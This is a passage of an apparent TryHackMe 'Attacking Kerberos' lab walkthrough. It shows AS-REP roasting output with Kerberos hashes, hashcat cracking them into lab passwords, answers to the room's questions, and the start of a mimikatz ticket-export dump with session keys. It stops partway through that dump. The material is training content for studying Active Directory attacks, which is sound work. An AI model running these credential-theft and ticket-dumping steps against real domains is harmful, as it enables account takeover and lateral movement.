[*] SamAccountName         : Admin2
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::c028:6341:3378:2d5a%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$Admin2@CONTROLLER.local:22C8D3204932277C02C00688CFA7F102$40581617AF62
      97022114344C38B90ED059E93B027B74F1CB2BD42E2D8CD9C252FEF6F10F35505BC8F168360D7060
      E4CA5645FF35C716C662093790A70254423FAFA33C8044143FD780CE8EABF4F0735F794F65A9F33A
      7428B8F2B17B59774CA6B31AD0F30F100D8CC7121002FDAE867CDA41B0511B839FE1FEE6AF85B9D4
      C3CDF8083FFDB7BB8F85AE59CDDE97CE47E529D1CE26512ACCA4A7732167D32B5D5D5D8B5927BD3F
      75DC8A6EC0CE16A562FDE7CEF62CC35345020FDB4FE73ED275D97AC1F15DC4F433857C40863E8652
      C087EB81ED6F06EE74EC6B8600CE8275AB7557E425EFC790B36FE3ADA76D58CF7A67D5F25470

[*] SamAccountName         : User3
[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::c028:6341:3378:2d5a%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$User3@CONTROLLER.local:487FB02EEC5B3276BBB1B68C2FFF00F9$B7D0139CA807D
      5A7584E9A4FFE35EF082DE33C6D8CE5BCC86CD96BDA38D0AC00BD7147635FDCF2B47D97B47916F29
      F193A56884E891818A60106DB73AD14A4E4CD15AE008EAA66DBB1743377375BBAA596DD6A3DD8C37
      B913997C71BDF9E2399A29BCBC37913089CA9A70B2FAECA67C4566E4889CC0DB255C6A404ED272C7
      A411CDCB190D6B3A1A85A0FD31F338FA87691F208F2D4584B2E42B687D0C45A2CDE058A6BF0A9063
      A65C37D0244AFC2FD740A7ADA02C18FB723BCBBB8ACA2DE372057C7F3FA8E4F10E4F02F43ED9FE81
      464ECCF49AF5C13E3DE4977DD03B67FDCCAB5E776611577C7C6870D9BA030B0579E33D0F11A
```
Cracking the hash using `hashcat -m 18200 asrep_hash.txt Pass.txt`
```bash
┌──(kali㉿kali)-[~/TryHackMe/AttackingKerberos/files]
└─$ hashcat -m 18200 asrep_hash.txt Pass.txt
hashcat (v6.2.6) starting

/sys/class/hwmon/hwmon3/temp1_input: No such file or directory

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-penryn-Intel(R) Core(TM) i5 CPU       M 520  @ 2.40GHz, 1362/2788 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: Pass.txt
* Passwords.: 1240
* Bytes.....: 9706
* Keyspace..: 1240

$krb5asrep$Admin2@CONTROLLER.local:22c8d3204932277c02c00688cfa7f102$40581617af6297022114344c38b90ed059e93b027b74f1cb2bd42e2d8cd9c252fef6f10f35505bc8f168360d7060e4ca5645ff35c716c662093790a70254423fafa33c8044143fd780ce8eabf4f0735f794f65a9f33a7428b8f2b17b59774ca6b31ad0f30f100d8cc7121002fdae867cda41b0511b839fe1fee6af85b9d4c3cdf8083ffdb7bb8f85ae59cdde97ce47e529d1ce26512acca4a7732167d32b5d5d5d8b5927bd3f75dc8a6ec0ce16a562fde7cef62cc35345020fdb4fe73ed275d97ac1f15dc4f433857c40863e8652c087eb81ed6f06ee74ec6b8600ce8275ab7557e425efc790b36fe3ada76d58cf7a67d5f25470:P@$$W0rd2
$krb5asrep$User3@CONTROLLER.local:487fb02eec5b3276bbb1b68c2fff00f9$b7d0139ca807d5a7584e9a4ffe35ef082de33c6d8ce5bcc86cd96bda38d0ac00bd7147635fdcf2b47d97b47916f29f193a56884e891818a60106db73ad14a4e4cd15ae008eaa66dbb1743377375bbaa596dd6a3dd8c37b913997c71bdf9e2399a29bcbc37913089ca9a70b2faeca67c4566e4889cc0db255c6a404ed272c7a411cdcb190d6b3a1a85a0fd31f338fa87691f208f2d4584b2e42b687d0c45a2cde058a6bf0a9063a65c37d0244afc2fd740a7ada02c18fb723bcbbb8aca2de372057c7f3fa8e4f10e4f02f43ed9fe81464eccf49af5c13e3de4977dd03b67fdccab5e776611577c7c6870d9ba030b0579e33d0f11a:Password3
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: asrep_hash.txt
Time.Started.....: Tue Jun 25 09:15:17 2024 (0 secs)
Time.Estimated...: Tue Jun 25 09:15:17 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (Pass.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   586.7 kH/s (1.14ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new), 2/2 (100.00%) Salts
Progress.........: 2048/2480 (82.58%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/1240 (0.00%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> moomoo
Hardware.Mon.#1..: Util: 32%

Started: Tue Jun 25 09:14:20 2024
Stopped: Tue Jun 25 09:15:20 2024

```
Got Credential 
```
Admin2:P@$$W0rd2
User3:Password3
```

### Question
- What hash type does AS-REP Roasting use?`Kerberos 5 AS-REP etype 23`
- Which User is vulnerable to AS-REP Roasting?`User3`
- What is the User's Password?`Password3`
- Which Admin is vulnerable to AS-REP Roasting?`Admin2`
- What is the Admin's Password?`P@$$W0rd2`

## Task 6 Pass the Ticket w/ mimikatz
```bash
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59              
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                               
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz                    
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/ 

mimikatz # privilege::debug 
Privilege '20' OK 

mimikatz # sekurlsa::tickets /export 

Authentication Id : 0 ; 399778 (00000000:000619a2)                                         
Session           : Network from 0                                                         
User Name         : CONTROLLER-1$                                                          
Domain            : CONTROLLER                                                             
Logon Server      : (null)                                                                 
Logon Time        : 6/24/2024 6:12:23 PM                                                   
SID               : S-1-5-18                                                               
                                                                                           
         * Username : CONTROLLER-1$                                                        
         * Domain   : CONTROLLER.LOCAL                                                     
         * Password : (null)                                                               
                                                                                           
        Group 0 - Ticket Granting Service                                                  
                                                                                           
        Group 1 - Client Ticket ?                                                          
         [00000000]                                                                        
           Start/End/MaxRenew: 6/24/2024 6:07:40 PM ; 6/25/2024 4:07:40 AM ;               
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL   
           Target Name  (--) : @ CONTROLLER.LOCAL                                          
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL                          
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;  
           Session Key       : 0x00000012 - aes256_hmac                                                      
             5648e0750373f1ea354b5b8d774adab4491813e74dd8ede4777dd4868860867c                                
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;619a2]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 399569 (00000000:000618d1)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/24/2024 6:12:23 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 6/24/2024 6:07:40 PM ; 6/25/2024 4:07:40 AM ;  
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             5648e0750373f1ea354b5b8d774adab4491813e74dd8ede4777dd4868860867c
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;618d1]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 190740 (00000000:0002e914)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/24/2024 6:07:40 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 6/24/2024 6:07:40 PM ; 6/25/2024 4:07:40 AM ; 7/1/2024 6:07:40 PM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             d108b2938441d1235d46c6c2afedad02e7ade986a010aba29af4bb56c357a45d
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...] 
           * Saved to file [0;2e914]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 60350 (00000000:0000ebbe)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/24/2024 6:07:04 PM
SID               : S-1-5-90-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local 
         * Password : fe 09 4c 08 0b cb e9 93 22 f0 ac d0 03 6d 7a be dd 10 c4 32 a0 f9 14 72 e7 25 44 a7 23 39 a4 68 3b 82 9e 60 ef d4 d3 5a
 8a 21 90 fe 71 14 bb 16 cf 47 f1 d7 9b 3d e5 e3 da cf 67 7e 9b 36 32 75 87 57 1b fc 8e e9 4e f6 30 3d 88 24 6e 4f 15 b9 f8 26 d3 d0 83 c0 67
 1c b4 59 2e d6 bd 13 07 60 5e 07 e7 ea 6e cd 77 da 97 f6 69 ea 4c 6e 75 e7 25 04 a5 d2 1d 6e 8b d2 90 4e a1 1d 63 1d 02 22 42 a9 07 0b 1b bb
 f1 dc 6e 14 ed ab fa e4 3b 90 41 0b 87 bb a2 4d 27 77 7a b0 b2 22 c8 de 48 64 fd 21 2e da df 68 cc e0 3a 04 67 8a 11 a2 f8 f4 b0 b0 d1 e3 51
 04 f1 fe da c9 f6 85 eb f4 25 a3 52 2a 00 e8 25 d3 9a 08 31 27 86 cd b3 fe 6e 40 f6 ed 59 03 fe b1 3a 98 bf f7 d5 6c 74 3e de 5d fb 15 f4 08
 c9 2b fd 0f c7 e7 6a 79 38 2c 93 4b

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/24/2024 6:07:01 PM
SID               : S-1-5-20

         * Username : controller-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 6/24/2024 6:37:07 PM ; 6/25/2024 4:37:07 AM ; 7/1/2024 6:37:07 PM
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac       
             a4b5331ccf96718cfba55cffd31f003c6be36c0e89217e12da4842a977e40635
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e4]-0-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 6/24/2024 6:37:07 PM ; 6/25/2024 4:37:07 AM ; 7/1/2024 6:37:07 PM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.local )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             1b2b79c96e05c8031c8c3645fa6008dc9b07c674a7b2df3b7f6eddf683c255f3
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e4]-2-0-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi ! 

Authentication Id : 0 ; 32762 (00000000:00007ffa)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/24/2024 6:07:00 PM
SID               : S-1-5-96-0-0

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 4f 86 7b 98 4a 5c 2c 96 e2 ce 1f 48 6f a1 cb 7d 3c b4 6a e0 72 c3 81 60 63 90 41 1e e1 8b fd a8 ff c3 f1 7f 84 d0 21 35
 52 fd 4a 17 07 36 a6 ba 16 3d 24 6b 60 4a e3 c4 b9 e6 38 ff 8a ee 0d 07 01 a5 bc 36 63 04 bc 38 5c ea 62 95 26 cc 3f c4 09 ab 0c 7f 41 08 ed
 e1 46 8d b2 8d 1d a9 ca 77 d6 c0 17 f6 38 38 59 66 73 9e cf 7f 96 b1 87 a1 8e 86 f8 b8 7d 84 e8 58 f3 cf 9c 96 90 a7 fd f5 73 18 62 8e 36 86
 d3 18 b5 06 36 68 5a 55 17 34 ac 7b 68 02 dd 99 83 f8 a9 d2 20 83 19 93 d6 79 bd 1e 3b c3 ac 79 c5 ff cc a5 49 58 ac 62 e5 22 8a 75 68 95 14
 b2 a5 de 75 25 2b 7a 31 8e 89 17 ad b0 93 07 44 43 4f ff 5a 4f f1 90 81 a3 4c 0f 9d 0c 89 3c 86 b2 0c 3d 61 3f d2 d8 09 1b 6a 9f af ed 9f f3
 4b 66 0c 1b af 71 15 bc f6 a7 37 41

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ? 

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 2679241 (00000000:0028e1c9)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/24/2024 6:38:40 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ? 

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 6/24/2024 6:07:40 PM ; 6/25/2024 4:07:40 AM ; 7/1/2024 6:07:40 PM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             d108b2938441d1235d46c6c2afedad02e7ade986a010aba29af4bb56c357a45d
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...] 
           * Saved to file [0;28e1c9]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 2081540 (00000000:001fc304)
Session           : NetworkCleartext from 0
User Name         : Administrator
Domain            : CONTROLLER
Logon Server      : CONTROLLER-1
Logon Time        : 6/24/2024 6:35:46 PM
SID               : S-1-5-21-432953485-3795405108-1502158860-500

         * Username : Administrator 
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 6/24/2024 6:52:43 PM ; 6/25/2024 4:35:46 AM ; 7/1/2024 6:35:46 PM
           Service Name (02) : CONTROLLER-1 ; HTTPService.CONTROLLER.local:30222 ; @ CONTROLLER.LOCAL
           Target Name  (02) : CONTROLLER-1 ; HTTPService.CONTROLLER.local:30222 ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000017 - rc4_hmac_nt
             36135430b4a31cea88be2ef1bd077203 
           Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 2        [...]
           * Saved to file [0;1fc304]-0-0-40a10000-Administrator@CONTROLLER-1-HTTPService.CONTROLLER.local~30222.kirbi !
         [00000001]
           Start/End/MaxRenew: 6/24/2024 6:52:43 PM ; 6/25/2024 4:35:46 AM ; 7/1/2024 6:35:46 PM
           Service Name (02) : CONTROLLER-1 ; SQLService.CONTROLLER.local:30111 ; @ CONTROLLER.LOCAL
           Target Name  (02) : CONTROLLER-1 ; SQLService.CONTROLLER.local:30111 ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL 
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000017 - rc4_hmac_nt
             9bf96dd0ca40ef8fe04cd6ea31860154
           Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 2        [...]
           * Saved to file [0;1fc304]-0-1-40a10000-Administrator@CONTROLLER-1-SQLService.CONTROLLER.local~30111.kirbi !

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket 
         [00000000]
           Start/End/MaxRenew: 6/24/2024 6:35:46 PM ; 6/25/2024 4:35:46 AM ; 7/1/2024 6:35:46 PM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             a56c7393882a0ea3087fb0a505562f9588fddde5acaa564304605aa88a2e1d11
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...] 
           * Saved to file [0;1fc304]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 2080254 (00000000:001fbdfe)
Session           : Service from 0
User Name         : sshd_564
Domain            : VIRTUAL USERS
Logon Server      : (null)
Logon Time        : 6/24/2024 6:35:40 PM
SID               : S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-564

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local 
         * Password : 4f 86 7b 98 4a 5c 2c 96 e2 ce 1f 48 6f a1 cb 7d 3c b4 6a e0 72 c3 81 60 63 90 41 1e e1 8b fd a8 ff c3 f1 7f 84 d0 21 35
 52 fd 4a 17 07 36 a6 ba 16 3d 24 6b 60 4a e3 c4 b9 e6 38 ff 8a ee 0d 07 01 a5 bc 36 63 04 bc 38 5c ea 62 95 26 cc 3f c4 09 ab 0c 7f 41 08 ed
 e1 46 8d b2 8d 1d a9 ca 77 d6 c0 17 f6 38 38 59 66 73 9e cf 7f 96 b1 87 a1 8e 86 f8 b8 7d 84 e8 58 f3 cf 9c 96 90 a7 fd f5 73 18 62 8e 36 86
 d3 18 b5 06 36 68 5a 55 17 34 ac 7b 68 02 dd 99 83 f8 a9 d2 20 83 19 93 d6 79 bd 1e 3b c3 ac 79 c5 ff cc a5 49 58 ac 62 e5 22 8a 75 68 95 14
 b2 a5 de 75 25 2b 7a 31 8e 89 17 ad b0 93 07 44 43 4f ff 5a 4f f1 90 81 a3 4c 0f 9d 0c 89 3c 86 b2 0c 3d 61 3f d2 d8 09 1b 6a 9f af ed 9f f3
 4b 66 0c 1b af 71 15 bc f6 a7 37 41

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 1673170 (00000000:001987d2)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/24/2024 6:22:11 PM
SID               : S-1-5-18 

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 6/24/2024 6:22:11 PM ; 6/25/2024 4:07:40 AM ;
           Service Name (02) : GC ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;  
           Session Key       : 0x00000012 - aes256_hmac
             1a98c1d99fafd84d4ae973080ab390ddbca0f736b863ff10b89730c41bbd4965
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;1987d2]-1-0-40a50000-CONTROLLER-1$@GC-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 399721 (00000000:00061969)
Session           : Network from 0 
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/24/2024 6:12:23 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 6/24/2024 6:07:48 PM ; 6/25/2024 4:07:40 AM ;
           Service Name (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL 
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             b553572d06114d99d160629e28c377b007e1d8a5ab8b7cdb05aae60361eeacfe
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;61969]-1-0-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi ! 

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 399661 (00000000:0006192d)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/24/2024 6:12:23 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ? 
         [00000000]
           Start/End/MaxRenew: 6/24/2024 6:07:40 PM ; 6/25/2024 4:07:40 AM ;
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             5648e0750373f1ea354b5b8d774adab4491813e74dd8ede4777dd4868860867c
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;6192d]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 190152 (00000000:0002e6c8)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/24/2024 6:07:40 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL 
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 6/24/2024 6:07:40 PM ; 6/25/2024 4:07:40 AM ;
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             5648e0750373f1ea354b5b8d774adab4491813e74dd8ede4777dd4868860867c 
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;2e6c8]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 6/24/2024 6:07:04 PM 
SID               : S-1-5-19

         * Username : (null)
         * Domain   : (null)
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 60331 (00000000:0000ebab)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/24/2024 6:07:04 PM
SID               : S-1-5-90-0-1 

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 4f 86 7b 98 4a 5c 2c 96 e2 ce 1f 48 6f a1 cb 7d 3c b4 6a e0 72 c3 81 60 63 90 41 1e e1 8b fd a8 ff c3 f1 7f 84 d0 21 35
 52 fd 4a 17 07 36 a6 ba 16 3d 24 6b 60 4a e3 c4 b9 e6 38 ff 8a ee 0d 07 01 a5 bc 36 63 04 bc 38 5c ea 62 95 26 cc 3f c4 09 ab 0c 7f 41 08 ed
 e1 46 8d b2 8d 1d a9 ca 77 d6 c0 17 f6 38 38 59 66 73 9e cf 7f 96 b1 87 a1 8e 86 f8 b8 7d 84 e8 58 f3 cf 9c 96 90 a7 fd f5 73 18 62 8e 36 86
 d3 18 b5 06 36 68 5a 55 17 34 ac 7b 68 02 dd 99 83 f8 a9 d2 20 83 19 93 d6 79 bd 1e 3b c3 ac 79 c5 ff cc a5 49 58 ac 62 e5 22 8a 75 68 95 14
 b2 a5 de 75 25 2b 7a 31 8e 89 17 ad b0 93 07 44 43 4f ff 5a 4f f1 90 81 a3 4c 0f 9d 0c 89 3c 86 b2 0c 3d 61 3f d2 d8 09 1b 6a 9f af ed 9f f3
 4b 66 0c 1b af 71 15 bc f6 a7 37 41

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 32920 (00000000:00008098)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host 
Logon Server      : (null)
Logon Time        : 6/24/2024 6:07:00 PM
SID               : S-1-5-96-0-0

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : fe 09 4c 08 0b cb e9 93 22 f0 ac d0 03 6d 7a be dd 10 c4 32 a0 f9 14 72 e7 25 44 a7 23 39 a4 68 3b 82 9e 60 ef d4 d3 5a
 8a 21 90 fe 71 14 bb 16 cf 47 f1 d7 9b 3d e5 e3 da cf 67 7e 9b 36 32 75 87 57 1b fc 8e e9 4e f6 30 3d 88 24 6e 4f 15 b9 f8 26 d3 d0 83 c0 67
